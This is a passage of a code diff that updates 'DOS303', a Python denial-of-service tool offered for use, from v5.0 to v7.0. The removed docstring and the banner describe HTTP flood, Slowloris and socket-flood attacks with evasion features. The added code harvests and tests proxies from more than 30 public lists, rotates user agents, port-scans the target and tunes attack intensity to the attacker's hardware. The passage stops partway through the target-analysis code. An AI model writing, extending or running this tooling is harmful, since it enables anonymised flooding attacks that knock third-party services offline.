@@ -1,23 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-DOS303 v5.0 - Hardened Edition (HTTP Flood + Slowloris + Socket Flood)
-- NO TOR SUPPORT - pure HTTP proxies only
-- Non-blocking async core
-- Dynamic proxy chain with auto-recheck after fallback
-- Multi-method HTTP flood (GET/POST/HEAD) with variable payloads
-- Evasion: random delays (normal distribution), mixed legitimate requests
-- Auto-calibration (60s) to set attack level based on system resources
-- Port scanning to find best target port
-- Configurable via command-line arguments
-- Comprehensive logging
-- FIXED: Auto-recheck proxies after 30 seconds in direct mode
-- FIXED: Direct fallback when proxies fail (consecutive_failures > 2)
-- FIXED: Ultra low delays (0.0005s minimum) for maximum speed
-- FIXED: Slowloris unlimited reconnect
-- FIXED: ConnectionResetError handling for Windows
-- CREDITS: @iazmonmn - Telegram: https://t.me/iazmonmn
-"""
 
 import os
 import sys
@@ -30,111 +12,142 @@ import signal
 import argparse
 import logging
 from urllib.parse import urlparse, urljoin
+from functools import partial
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import multiprocessing as mp
 
+# ============================================
+# LIBRARIES
+# ============================================
 try:
     import aiohttp
     import psutil
+    from fake_useragent import UserAgent
+    import httpx
+    from curl_cffi import requests as curl_requests
+    import cloudscraper
+    from colorama import Fore, Back, Style, init as colorama_init
+    from tqdm import tqdm
+    import requests
+    import socks
 except ImportError as e:
-    print(f"Missing dependency: {e}. Please install: pip install aiohttp psutil")
+    print(f"Missing dependency: {e}. Please install: pip install aiohttp psutil fake-useragent httpx curl_cffi cloudscraper colorama tqdm requests pysocks")
     sys.exit(1)
 
-# ============================================
-# LOGGING SETUP
-# ============================================
-logging.basicConfig(
-    level=logging.INFO,
-    format='[%(asctime)s] %(levelname)s - %(message)s',
-    datefmt='%Y-%m-%d %H:%M:%S'
-)
-logger = logging.getLogger('DOS303')
+colorama_init(autoreset=True)
 
 # ============================================
-# BANNER WITH CREDITS
+# COLORED LOGGING
+# ============================================
+class ColoredFormatter(logging.Formatter):
+    COLORS = {
+        'DEBUG': Fore.CYAN,
+        'INFO': Fore.GREEN,
+        'WARNING': Fore.YELLOW,
+        'ERROR': Fore.RED,
+        'CRITICAL': Fore.RED + Back.WHITE,
+    }
+
+    def format(self, record):
+        levelname = record.levelname
+        if levelname in self.COLORS:
+            record.levelname = f"{self.COLORS[levelname]}{levelname}{Style.RESET_ALL}"
+        return super().format(record)
+
+handler = logging.StreamHandler()
+handler.setFormatter(ColoredFormatter('[%(asctime)s] %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
+logger = logging.getLogger('DOS303')
+logger.setLevel(logging.INFO)
+logger.handlers.clear()
+logger.addHandler(handler)
+
+# ============================================
+# BANNER
 # ============================================
 def show_banner():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("\033[92m")
-    print("""
-╔══════════════════════════════════════════╗
-║     DOS303 v5.0 - HARDENED EDITION      ║
-║      💀 Multi-Vector Bypass Engine      ║
-║    🔥 Auto-Calibrating | Evasive        ║
-║    🔄 Auto-Recheck Proxies              ║
-║    🚀 Dynamic Proxy Chain               ║
-║    🔎 Smart Port Scanning               ║
-║    🚫 NO TOR - Pure HTTP Proxies       ║
-║    ⚡ Ultra Speed (0.0005s delay)       ║
-║         🏆 Score: 10/10                 ║
-║    👑 Coded by: @iazmonmn              ║
-║    📱 Telegram: https://t.me/iazmonmn  ║
-╚══════════════════════════════════════════╝
-\033[0m
-""")
+    print(Fore.GREEN + """
+╔═══════════════════════════════════════════════════════════════════╗
+║     DOS303 v7.0 - OPTIMIZED ATTACK SEQUENCE                       ║
+║      💀 Multi-Vector Bypass Engine                                ║
+║    🔥 Auto-Calibrate → Proxy Analysis → Target → Attack           ║
+║    🚀 MAXIMUM POWER for proxy scanning (all cores)                ║
+║    ⚡ Ultra Speed (0.0005s delay)                                 ║
+║    ☁️  cloudscraper | colorama | tqdm                             ║
+║         🏆 Score: 10/10                                          ║
+║    👑 Coded by: @iazmonmn                                        ║
+║    📱 Telegram: https://t.me/iazmonmn                             ║
+╚═══════════════════════════════════════════════════════════════════╝
+""" + Style.RESET_ALL)
 
 # ============================================
-# PORT SCANNER
+# SMART DNS TARGETS
 # ============================================
-class PortScanner:
-    @staticmethod
-    async def scan(host, ports=None, timeout=2):
-        if ports is None:
-            ports = [80, 443, 8080, 8443, 8000, 81, 88, 3000, 5000, 5432, 3306, 4443, 9000]
-        tasks = []
-        for port in ports:
-            tasks.append(PortScanner._check_port(host, port, timeout))
-        results = await asyncio.gather(*tasks)
-        open_ports = [port for port, is_open in results if is_open]
-        return open_ports
-    
-    @staticmethod
-    async def _check_port(host, port, timeout):
-        try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port),
-                timeout=timeout
-            )
-            writer.close()
-            await writer.wait_closed()
-            return port, True
-        except:
-            return port, False
+DNS_TARGETS = [
+    ("1.1.1.1", 53),        # Cloudflare
+    ("8.8.8.8", 53),        # Google
+    ("10.202.10.202", 53),  # Shecan (Iran)
+    ("9.9.9.9", 53),        # Quad9
+    ("208.67.222.222", 53), # OpenDNS
+]
 
 # ============================================
-# USER-AGENT MANAGER (with GitHub repos + huge fallback)
+# 30+ GITHUB PROXY SOURCES
+# ============================================
+PROXY_SOURCES = [
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
+    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
+    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
+    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/all.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
+    "https://www.proxy-list.download/api/v1/get?type=http",
+    "https://www.proxy-list.download/api/v1/get?type=socks4",
+    "https://www.proxy-list.download/api/v1/get?type=socks5",
+    "https://raw.githubusercontent.com/mmpx222/proxy-list/main/proxies.txt",
+    "https://raw.githubusercontent.com/alexilario/ProxyList/main/proxy-list.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/proxy_list.txt",
+    "https://raw.githubusercontent.com/secure-ur-software/proxy-list/main/proxies.txt",
+]
+
+# ============================================
+# USER-AGENT MANAGER
 # ============================================
 class UserAgentManager:
     def __init__(self):
-        self.user_agents = []
-        self._load_from_files()
-        if not self.user_agents:
-            self._fallback_agents()
-        logger.info(f"Loaded {len(self.user_agents)} User-Agents")
+        self.fake_ua = None
+        self.fallback_agents = self._get_fallback_list()
+        self._init_fake_ua()
+        logger.info(f"Loaded {len(self.fallback_agents)} fallback User-Agents + fake-useragent")
 
-    def _load_from_files(self):
-        urls = [
-            "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/refs/heads/main/useragents-macos.txt",
-            "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/refs/heads/main/useragents-ios.txt",
-            "https://raw.githubusercontent.com/HyperBeats/User-Agent-List/refs/heads/main/useragents-android.txt"
-        ]
-        for url in urls:
-            try:
-                import urllib.request
-                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-                with urllib.request.urlopen(req, timeout=10) as response:
-                    content = response.read().decode('utf-8', errors='ignore')
-                    for line in content.split('\n'):
-                        line = line.strip()
-                        if line and not line.startswith('#'):
-                            self.user_agents.append(line)
-                logger.info(f"   ✅ Loaded from {url.split('/')[-1]}")
-            except Exception as e:
-                logger.warning(f"   ⚠️ Failed to load from {url}: {e}")
-        
-        if len(self.user_agents) < 100:
-            self._fallback_agents()
+    def _init_fake_ua(self):
+        try:
+            self.fake_ua = UserAgent()
+            test = self.fake_ua.random
+        except Exception as e:
+            logger.warning(f"fake-useragent failed: {e}, using fallback only")
+            self.fake_ua = None
 
-    def _fallback_agents(self):
-        self.user_agents = [
+    def _get_fallback_list(self):
+        return [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -143,26 +156,17 @@ class UserAgentManager:
             'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
             'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
             'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
-            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
-            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
         ]
 
     def get_random(self):
-        return random.choice(self.user_agents)
+        if self.fake_ua:
+            try:
+                return self.fake_ua.random
+            except Exception:
+                pass
+        return random.choice(self.fallback_agents)
 
 # ============================================
 # HEADER MANAGER
@@ -192,7 +196,7 @@ class HeaderManager:
     def get_headers(self, user_agent, target_url=None, method='GET'):
         headers = self.headers_template.copy()
         headers['User-Agent'] = user_agent
-        headers['X-Powered-By'] = 'DOS303 v5.0'
+        headers['X-Powered-By'] = 'DOS303 v7.0'
         headers['X-Coded-By'] = 'https://t.me/iazmonmn'
         if target_url:
             parsed = urlparse(target_url)
@@ -208,185 +212,274 @@ class HeaderManager:
         return headers
 
 # ============================================
-# PROXY MANAGER - WITH AUTO-RECHECK AFTER FALLBACK
+# SMART PROXY TESTER
+# ============================================
+def parse_proxy_line(line):
+    line = line.strip()
+    if not line:
+        return None
+    
+    if '://' in line:
+        parsed = urlparse(line)
+        proxy_type = parsed.scheme
+        netloc = parsed.netloc
+        if not netloc and ':' in parsed.path:
+            netloc = parsed.path
+    else:
+        if ':' in line:
+            proxy_type = "http"
+            netloc = line
+        else:
+            return None
+    
+    if ':' not in netloc:
+        return None
+    
+    parts = netloc.split(':', 1)
+    if len(parts) != 2:
+        return None
+    
+    ip, port = parts[0].strip(), parts[1].strip()
+    if not port.isdigit():
+        return None
+    
+    proxy_type_map = {
+        'http': 'http',
+        'https': 'http',
+        'socks5': 'socks5',
+        'socks4': 'socks4',
+        'socks4a': 'socks4',
+        'socks': 'socks5'
+    }
+    
+    return {"ip": ip, "port": int(port), "type": proxy_type_map.get(proxy_type, 'http')}
+
+
+def test_proxy_with_dns(proxy):
+    try:
+        start = time.perf_counter()
+        proxy_type = socks.SOCKS5 if proxy["type"] == "socks5" else socks.SOCKS4 if proxy["type"] == "socks4" else None
+        
+        if proxy_type is None:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1.5)
+                sock.connect((proxy['ip'], proxy['port']))
+                sock.close()
+                latency = (time.perf_counter() - start) * 1000
+                return proxy, latency, True
+            except:
+                return proxy, 9999, False
+        
+        for dns_ip, dns_port in DNS_TARGETS:
+            try:
+                s = socks.socksocket()
+                s.set_proxy(proxy_type, proxy['ip'], proxy['port'])
+                s.settimeout(1.5)
+                s.connect((dns_ip, dns_port))
+                s.close()
+                latency = (time.perf_counter() - start) * 1000
+                return proxy, latency, True
+            except:
+                continue
+        
+        return proxy, 9999, False
+    except:
+        return proxy, 9999, False
+
+
+def test_proxy_http(proxy):
+    test_urls = [
+        "http://neverssl.com",
+        "http://example.com",
+        "http://icanhazip.com",
+    ]
+    
+    for url in test_urls:
+        try:
+            test_proxies = {
+                "http": f"{proxy['type']}://{proxy['ip']}:{proxy['port']}",
+                "https": f"{proxy['type']}://{proxy['ip']}:{proxy['port']}"
+            }
+            start = time.perf_counter()
+            r = requests.get(url, proxies=test_proxies, timeout=2)
+            if r.status_code == 200:
+                http_latency = (time.perf_counter() - start) * 1000
+                return http_latency
+        except:
+            continue
+    return None
+
+
+def fetch_proxies_from_sources(log_callback=None):
+    def log(msg):
+        if log_callback:
+            log_callback(msg)
+    
+    all_proxies = []
+    for url in tqdm(PROXY_SOURCES, desc="Fetching proxies", leave=False):
+        try:
+            resp = requests.get(url, timeout=15, headers={'User-Agent': 'Mozilla/5.0'})
+            if resp.status_code == 200:
+                for line in resp.text.splitlines():
+                    line = line.strip()
+                    if not line or line.startswith('#'):
+                        continue
+                    parsed = parse_proxy_line(line)
+                    if parsed:
+                        all_proxies.append(parsed)
+        except Exception as e:
+            log(f"Failed to load {url.split('/')[-1]}: {str(e)[:30]}")
+    
+    return all_proxies
+
+
+def scan_proxies_smart(proxy_list, max_workers=None, log_callback=None):
+    """اسکن هوشمند پروکسی با حداکثر توان"""
+    def log(msg):
+        if log_callback:
+            log_callback(msg)
+    
+    if not proxy_list:
+        return []
+    
+    if max_workers is None:
+        max_workers = min(mp.cpu_count() * 4, 500)
+    
+    log(f"[*] Testing {len(proxy_list)} proxies with {max_workers} workers...")
+    
+    # مرحله ۱: تست DNS
+    results = []
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = {executor.submit(test_proxy_with_dns, p): p for p in proxy_list}
+        for future in tqdm(as_completed(futures), total=len(futures), desc="DNS Test", leave=False):
+            proxy, latency, ok = future.result()
+            if ok and latency < 1000:
+                proxy['latency'] = latency
+                results.append(proxy)
+    
+    log(f"[*] {len(results)} proxies passed DNS test. Testing HTTP...")
+    
+    # مرحله ۲: تست HTTP
+    http_results = []
+    for proxy in tqdm(results, desc="HTTP Test", leave=False):
+        if proxy.get('latency', 9999) < 800:
+            http_latency = test_proxy_http(proxy)
+            if http_latency is not None:
+                proxy['http_latency'] = http_latency
+                http_results.append(proxy)
+    
+    http_results.sort(key=lambda x: (x.get('latency', 9999), x.get('http_latency', 9999)))
+    
+    log(f"[+] {len(http_results)} proxies fully verified")
+    return http_results
+
+# ============================================
+# PROXY MANAGER
 # ============================================
 class ProxyManager:
-    def __init__(self, refresh_interval=300, max_uses_per_proxy=5):
-        self.all_proxies = []
-        self.active_proxies = []
-        self.dead_proxies = set()
-        self.lock = asyncio.Lock()
-        self.refresh_interval = refresh_interval
+    def __init__(self, max_proxies=2000):
+        self.proxies = []
+        self.lock = threading.Lock()
+        self.index = 0
+        self.max_proxies = max_proxies
+        self.running = True
+        self.background_thread = None
+        self.refresh_interval = 30
         self.last_refresh = 0
-        self.max_uses_per_proxy = max_uses_per_proxy
-        self.proxy_usage_count = {}
-        self.proxy_quality = {}
+    
+    def log(self, msg):
+        logger.info(msg)
+    
+    def load_proxies(self, max_workers=None):
+        """بارگذاری پروکسی با حداکثر توان"""
+        self.log("[*] Fetching proxies from 30+ sources with MAX POWER...")
         
-        self.proxy_chain = []
-        self.proxy_queue = asyncio.Queue()
-        self.current_chain_index = 0
-        self.chain_lock = asyncio.Lock()
-        self.is_refreshing = False
-        self.fallback_direct = False
-        self.last_fallback_time = 0
-        self.recheck_interval = 30  # seconds
-        
-        self._load_from_file()
-        if not self.all_proxies:
-            self._load_from_web()
-        if not self.all_proxies:
+        raw = fetch_proxies_from_sources(self.log)
+        if not raw:
+            self.log("[!] No raw proxies found, using fallback")
             self._fallback_proxies()
-        self.active_proxies = self.all_proxies.copy()
-        for p in self.active_proxies:
-            self.proxy_quality[p] = 0.5
-            self.proxy_usage_count[p] = 0
-        logger.info(f"Loaded {len(self.all_proxies)} HTTP proxies")
-
-    def _load_from_file(self):
-        try:
-            local_file = os.path.join(os.path.dirname(__file__), 'data', 'proxies.txt')
-            if os.path.exists(local_file):
-                with open(local_file, 'r', encoding='utf-8') as f:
-                    for line in f:
-                        line = line.strip()
-                        if line and not line.startswith('#'):
-                            if '://' in line and line.startswith(('http://', 'https://')):
-                                self.all_proxies.append(line)
-                            else:
-                                self.all_proxies.append(f"http://{line}")
-        except Exception:
-            pass
-
-    def _load_from_web(self):
-        proxy_sources = [
-            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
-            "https://www.proxy-list.download/api/v1/get?type=http",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-            "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/all.txt"
-        ]
-        all_proxies = []
-        for url in proxy_sources:
-            try:
-                import urllib.request
-                with urllib.request.urlopen(url, timeout=5) as response:
-                    content = response.read().decode()
-                    for line in content.split('\n'):
-                        line = line.strip()
-                        if line and not line.startswith('#'):
-                            if '://' in line and line.startswith(('http://', 'https://')):
-                                all_proxies.append(line)
-                            else:
-                                all_proxies.append(f"http://{line}")
-            except Exception:
-                pass
-        if all_proxies:
-            self.all_proxies = list(set(all_proxies))
-            random.shuffle(self.all_proxies)
-
-    def _fallback_proxies(self):
-        self.all_proxies = [
-            'http://45.33.24.170:8080', 'http://45.76.141.197:8888',
-            'http://31.186.171.169:8080', 'http://88.198.26.183:3128',
-            'http://5.189.157.139:8080', 'http://212.83.138.188:8080',
-        ]
-
-    async def refresh(self):
-        async with self.lock:
-            if time.time() - self.last_refresh < self.refresh_interval:
-                return
-            logger.info("Refreshing proxy list from web...")
-            self._load_from_web()
-            self.active_proxies = [p for p in self.all_proxies if p not in self.dead_proxies]
-            for p in self.active_proxies:
-                if p not in self.proxy_quality:
-                    self.proxy_quality[p] = 0.5
-                if p not in self.proxy_usage_count:
-                    self.proxy_usage_count[p] = 0
-            self.last_refresh = time.time()
-            logger.info(f"Proxy refresh complete. Total: {len(self.all_proxies)}, Active: {len(self.active_proxies)}")
-
-    async def refresh_chain(self):
-        if self.is_refreshing:
-            return
-        self.is_refreshing = True
-        try:
-            logger.info("🔄 Building proxy chain...")
-            await self.refresh()
-            async with self.chain_lock:
-                self.proxy_chain = self.active_proxies[:1000]
-                await self._fill_queue()
-                logger.info(f"✅ Chain ready: {len(self.proxy_chain)} proxies")
-                # Reset fallback state if we have proxies
-                if self.proxy_chain:
-                    self.fallback_direct = False
-        except Exception as e:
-            logger.error(f"Chain refresh error: {e}")
-            self.proxy_chain = self.active_proxies[:1000] if self.active_proxies else []
-            await self._fill_queue()
-        finally:
-            self.is_refreshing = False
-
-    async def _fill_queue(self):
-        self.proxy_queue = asyncio.Queue()
-        for proxy in self.proxy_chain:
-            await self.proxy_queue.put(proxy)
-
-    async def get_next_proxy(self):
-        # If in fallback mode, check if we should recheck
-        if self.fallback_direct:
-            if time.time() - self.last_fallback_time > self.recheck_interval:
-                logger.info("🔁 Rechecking proxies after fallback...")
-                await self.refresh_chain()
-                self.last_fallback_time = time.time()
-                # If chain rebuilt successfully, fallback_direct will be reset
-                if self.proxy_chain:
-                    self.fallback_direct = False
-                    logger.info(f"✅ Fallback ended, using {len(self.proxy_chain)} proxies")
-                else:
-                    self.fallback_direct = True
-                    return None
+            return len(self.proxies)
         
-        try:
-            proxy = self.proxy_queue.get_nowait()
-            if self.proxy_chain:
-                next_index = (self.current_chain_index + 1) % len(self.proxy_chain)
-                self.current_chain_index = next_index
-                await self.proxy_queue.put(self.proxy_chain[next_index])
-            return proxy
-        except asyncio.QueueEmpty:
-            if self.active_proxies:
-                proxy = random.choice(self.active_proxies)
-                return proxy
-            # Enter fallback mode
-            self.fallback_direct = True
-            self.last_fallback_time = time.time()
-            return None
-
-    async def mark_dead(self, proxy):
-        if not proxy:
+        scanned = scan_proxies_smart(raw, max_workers, self.log)
+        if not scanned:
+            self.log("[!] No working proxies found, using fallback")
+            self._fallback_proxies()
+            return len(self.proxies)
+        
+        with self.lock:
+            self.proxies = scanned[:self.max_proxies]
+            self.log(f"[+] Proxy list loaded: {len(self.proxies)} active proxies")
+            return len(self.proxies)
+    
+    def _fallback_proxies(self):
+        fallback = [
+            {'ip': '45.33.24.170', 'port': 8080, 'type': 'http', 'latency': 100},
+            {'ip': '45.76.141.197', 'port': 8888, 'type': 'http', 'latency': 120},
+            {'ip': '31.186.171.169', 'port': 8080, 'type': 'http', 'latency': 150},
+            {'ip': '88.198.26.183', 'port': 3128, 'type': 'http', 'latency': 200},
+            {'ip': '5.189.157.139', 'port': 8080, 'type': 'http', 'latency': 180},
+            {'ip': '212.83.138.188', 'port': 8080, 'type': 'http', 'latency': 160},
+        ]
+        with self.lock:
+            self.proxies = fallback
+            self.log(f"[+] Using {len(self.proxies)} fallback proxies")
+    
+    def refresh_proxies_sync(self):
+        """تازه‌سازی پروکسی در پس‌زمینه"""
+        if time.time() - self.last_refresh < self.refresh_interval:
             return
-        async with self.lock:
-            if proxy in self.active_proxies:
-                self.active_proxies.remove(proxy)
-            self.dead_proxies.add(proxy)
-            if proxy in self.proxy_usage_count:
-                del self.proxy_usage_count[proxy]
-            if proxy in self.proxy_quality:
-                del self.proxy_quality[proxy]
-
-    async def get_stats(self):
-        async with self.lock:
-            total = len(self.all_proxies)
-            dead = len(self.dead_proxies)
-            active = len(self.active_proxies)
-            chain_len = len(self.proxy_chain)
-            queue_size = self.proxy_queue.qsize()
-            in_fallback = self.fallback_direct
-            return total, dead, active, chain_len, queue_size, in_fallback
-
-    async def is_all_dead(self):
-        async with self.lock:
-            return len(self.active_proxies) == 0
+        self.last_refresh = time.time()
+        self.log("[*] Refreshing proxies in background...")
+        
+        # استفاده از workerهای کمتر برای پس‌زمینه
+        raw = fetch_proxies_from_sources(self.log)
+        if raw:
+            scanned = scan_proxies_smart(raw, max_workers=50, log_callback=self.log)
+            if scanned:
+                with self.lock:
+                    for p in scanned:
+                        exists = False
+                        for existing in self.proxies:
+                            if existing['ip'] == p['ip'] and existing['port'] == p['port']:
+                                exists = True
+                                break
+                        if not exists:
+                            self.proxies.append(p)
+                    if len(self.proxies) > self.max_proxies:
+                        self.proxies = self.proxies[:self.max_proxies]
+                    self.log(f"[+] Proxy refresh complete: {len(self.proxies)} active")
+    
+    def get_next_proxy(self):
+        with self.lock:
+            if not self.proxies:
+                return None
+            proxy = self.proxies[self.index % len(self.proxies)]
+            self.index += 1
+            return proxy
+    
+    def get_proxy_count(self):
+        with self.lock:
+            return len(self.proxies)
+    
+    def mark_dead(self, proxy):
+        with self.lock:
+            if proxy in self.proxies:
+                self.proxies.remove(proxy)
+                self.log(f"[ProxyManager] Removed dead proxy: {proxy['ip']}:{proxy['port']}")
+    
+    def start_background_refresh(self):
+        def refresh_loop():
+            while self.running:
+                time.sleep(self.refresh_interval)
+                if self.running:
+                    self.refresh_proxies_sync()
+        
+        self.background_thread = threading.Thread(target=refresh_loop, daemon=True)
+        self.background_thread.start()
+    
+    def stop(self):
+        self.running = False
 
 # ============================================
 # PATH MANAGER
@@ -394,22 +487,8 @@ class ProxyManager:
 class PathManager:
     def __init__(self):
         self.paths = []
-        self._load_from_file()
-        if not self.paths:
-            self._fallback_paths()
+        self._fallback_paths()
         logger.info(f"Loaded {len(self.paths)} paths")
-
-    def _load_from_file(self):
-        try:
-            local_file = os.path.join(os.path.dirname(__file__), 'data', 'paths.txt')
-            if os.path.exists(local_file):
-                with open(local_file, 'r', encoding='utf-8') as f:
-                    for line in f:
-                        line = line.strip()
-                        if line and not line.startswith('#'):
-                            self.paths.append(line)
-        except Exception:
-            pass
 
     def _fallback_paths(self):
         base = [
@@ -479,7 +558,7 @@ class SystemAnalyzer:
             cpu_percents = []
             ram_available = []
 
-            for i in range(60):
+            for i in tqdm(range(60), desc="Calibrating", unit="s"):
                 cpu_percents.append(psutil.cpu_percent(interval=None))
                 ram_available.append(psutil.virtual_memory().available / (1024**3))
                 if i % 10 == 0:
@@ -507,11 +586,12 @@ class SystemAnalyzer:
                 'ram_gb': round(ram_total, 1),
                 'workers': self._get_workers(level, cpu_cores),
                 'connections': self._get_connections(level),
-                'packet_rate': self._get_packet_rate(level)
+                'packet_rate': self._get_packet_rate(level),
+                'proxy_workers': min(cpu_cores * 8, 500)  # حداکثر توان برای اسکن پروکسی
             }
         except Exception as e:
             logger.error(f"Calibration failed: {e}")
-            return {'level': 4, 'level_name': "معمولی 😐", 'workers': 200, 'connections': 800, 'packet_rate': 1200}
+            return {'level': 4, 'level_name': "معمولی 😐", 'workers': 200, 'connections': 800, 'packet_rate': 1200, 'proxy_workers': 100}
 
     def _get_level(self, score):
         if score >= 95: return 9
@@ -535,6 +615,79 @@ class SystemAnalyzer:
     def _get_packet_rate(self, level):
         rates = [100, 300, 500, 800, 1200, 2000, 3000, 5000, 8000, 12000]
         return rates[level]
+
+# ============================================
+# PORT SCANNER & TARGET ANALYZER
+# ============================================
+class PortScanner:
+    @staticmethod
+    async def scan(host, ports=None, timeout=2):
+        if ports is None:
+            ports = [80, 443, 8080, 8443, 8000, 81, 88, 3000, 5000, 5432, 3306, 4443, 9000]
+        tasks = []
+        for port in ports:
+            tasks.append(PortScanner._check_port(host, port, timeout))
+        results = await asyncio.gather(*tasks)
+        return [port for port, is_open in results if is_open]
+    
+    @staticmethod
+    async def _check_port(host, port, timeout):
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port),
+                timeout=timeout
+            )
+            writer.close()
+            await writer.wait_closed()
+            return port, True
+        except:
+            return port, False
+
+class TargetAnalyzer:
+    @staticmethod
+    async def analyze(target_url, proxy_manager=None):
+        """تحلیل کامل هدف: port scan + initial response"""
+        logger.info(f"🔍 Analyzing target: {target_url}")
+        parsed = urlparse(target_url)
+        host = parsed.hostname
+        original_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+        
+        # Port scan
+        open_ports = await PortScanner.scan(host)
+        if open_ports:
+            logger.info(f"   ✅ Open ports found: {open_ports}")
+            if 80 in open_ports:
+                port = 80
+            elif 443 in open_ports:
+                port = 443
+            else:
+                port = open_ports[0]
+        else:
+            logger.warning("   ❌ No open ports found, using default port 80")
+            port = 80
+        
+        # Build final target
+        final_target = f"{parsed.scheme}://{host}:{port}"
+        logger.info(f"   💡 Selected target: {final_target}")
+        
+        # Initial HTTP response (optional)
+        try:
+            proxy = proxy_manager.get_next_proxy() if proxy_manager else None
+            connector = aiohttp.TCPConnector(ssl=False)
+            async with aiohttp.ClientSession(connector=connector) as session:
+                async with session.get(final_target, proxy=proxy, timeout=10) as resp:
+                    logger.info(f"   ✅ Target responded with status: {resp.status}")
+                    server = resp.headers.get('Server', 'Unknown')
